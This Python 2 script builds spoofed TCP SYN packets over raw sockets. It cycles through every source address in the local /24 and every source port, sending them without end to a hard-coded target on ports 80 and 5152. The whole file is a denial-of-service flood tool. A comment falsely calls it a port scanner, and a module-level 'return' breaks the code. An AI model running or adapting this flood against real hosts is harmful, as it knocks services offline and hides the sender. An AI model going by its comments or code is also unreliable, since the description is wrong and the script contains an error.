'''
    Thanks to Silver Moon (m00n.silv3r+gmail.com)
'''

import socket, fcntl
from struct import pack

# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    for i in xrange(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff
    return s

def getLocalIP(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mac = fcntl.ioctl(s.fileno(), 0x8927,  pack('256s', ifname[:15]))
    mac = ':'.join(['%02x' % ord(char) for char in mac[18:24]])
    ip = fcntl.ioctl(s.fileno(), 0x8915, pack('256s', ifname[:15]))
    ip = socket.inet_ntoa(ip[20:24])
    s.close()
    return {'mac': mac, 'ip': ip}

def pPacket(source_address, source_port, remote_address, remote_port):

    ip_header = pack('!BBHHHBBH4s4s' , 69, 0, 40, 65535, 0, 255, 6, 0, source_address, remote_address)
    tcp_header = pack('!HHLLBBHHH' , source_port, remote_port, 2002, 1001, 80, 2,  53270, 0, 0)

    psh = pack('!4s4sBBH' , source_address , remote_address , 0 , 6 , 20)
    psh = psh + tcp_header
    tcp_checksum = checksum(psh)
    tcp_header = pack('!HHLLBBHHH' , source_port, remote_port, 2002, 1001, 80, 2,  53270, tcp_checksum , 0)

    return ip_header + tcp_header


#
#
#   TEST
#
#

target_ip = '192.168.152.134'
target_ports = [80, 5152]  # auto scan, detect all open ports

if __name__ == '__main__':
    local = getLocalIP('eth0')
    source_ip = local['ip']
    ip_blocks = source_ip.split('.')

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        return

    remote_address = socket.inet_aton(target_ip)
    while True:
        for i in xrange(256):
            source_ip = '.'.join(ip_blocks[0:3]) + '.' + str(i)
            print 'Pretending: ', source_ip

            source_address = socket.inet_aton(source_ip)
            for source_port in xrange(65536):

                for target_port in target_ports:
                    packet = pPacket(source_address, source_port, remote_address, target_port)
                    s.sendto(packet, (target_ip, 0))
